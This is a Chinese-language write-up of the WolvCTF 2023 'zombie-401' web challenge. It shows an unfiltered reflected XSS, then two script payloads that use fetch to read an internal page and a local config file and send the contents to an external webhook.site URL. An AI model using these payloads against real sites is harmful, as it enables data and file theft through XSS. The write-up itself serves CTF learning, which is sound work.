# WolvCTF(2023)-zombie-401 writeup

访问题目地址:

![web-3.1](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.1.png)

有两个输入框，先看下前端代码,只有两个接口信息：
![web-3.2](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.2.png)

貌似没啥东西，第一个输入框要求输入一个zombie节目，第二个是输入一个zombie节目url。

第一个框随便输入内容之后，回显内容如下，输入内容嵌入到页面里面了

![web-3.3](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.3.png)

试试xss注入,很好，没有过滤：

<script>alert(1)</script>

请求地址：`http://49.232.142.230:11589/zombie?show=%3Cscript%3Ealert%281%29%3C%2Fscript%3E`

![web-3.8](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.8.png)

第二个框是输入一个url,随便输入之后，回显内容要求输入的url中host头要和题目地址一样，emm

![web-3.9](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.9.png)

试下301中的payload：

```
<script>fetch("http://49.232.142.230:18115/").then((data) => fetch("https://webhook.site/409eebb6-3c36-4da2-915b-1d2c3ea3426c?c=".concat(JSON.stringify(data))));</script>
```

回弹信息中没有flag了：

![web-6.1](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-6.1.png)

这个靶场其实是前端页面托管在 Node.js 服务端，服务端开放了 SSRF/本地协议读取漏洞，或者 fetch 本身是被 polyfill（或伪造）成可以访问本地文件的

![web-6.2](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-6.2.png)

在 Node.js 里，fetch 实际上是调用如 `node-fetch`、`undici` 等模块实现的，而这些模块**是可以访问本地文件协议的**

直接读取本地的flag文件：

```
<script>fetch("file:///ctf/app/config.json").then(a=>a.text()).then(a=>fetch("https://webhook.site/409eebb6-3c36-4da2-915b-1d2c3ea3426c?"+a))</script>
```

![web-6.3](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-6.3.png)
